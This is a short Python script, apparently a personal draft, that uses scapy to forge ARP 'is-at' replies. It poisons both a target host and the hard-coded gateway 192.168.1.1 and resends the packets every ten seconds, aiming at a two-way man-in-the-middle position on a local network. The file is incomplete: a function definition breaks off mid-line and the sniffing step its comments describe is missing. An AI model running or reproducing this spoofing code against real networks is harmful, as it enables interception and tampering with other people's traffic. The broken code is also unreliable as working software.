#!/bin/python3
import sys
import time
from scapy.all import sendp, ARP, Ether, sniff 

# the prog will first sniff the target
# then it will capture the ARP-request for it
# then forge the response and request for both sides
# it should achieve the 2-way Man-In-the-Middle.


if len(sys.argv) < 3:
	print( sys.argv[0] + ": <target> <spoof_ip>") # 
	sys.exit(1)

iface = "wlo1" 

target_ip = sys.argv[1]
fake_ip = sys.argv[2]
def_gate = "192.168.1.1"


ethernet = Ether()
arp_client = ARP(pdst=target_ip,
	psrc=fake_ip,
	op="is-at")

arp_serv = ARP(pdst=def_gate,
		psrc=target_ip,
		op="is-at") 

packet_tg = ethernet / arp_client
packet_defgate = ethernet / arp_serv 



def retranslate(

while True:
	sendp(packet_defgate, iface=iface)
	sendp(packet_tg, iface=iface) 
	time.sleep(10)

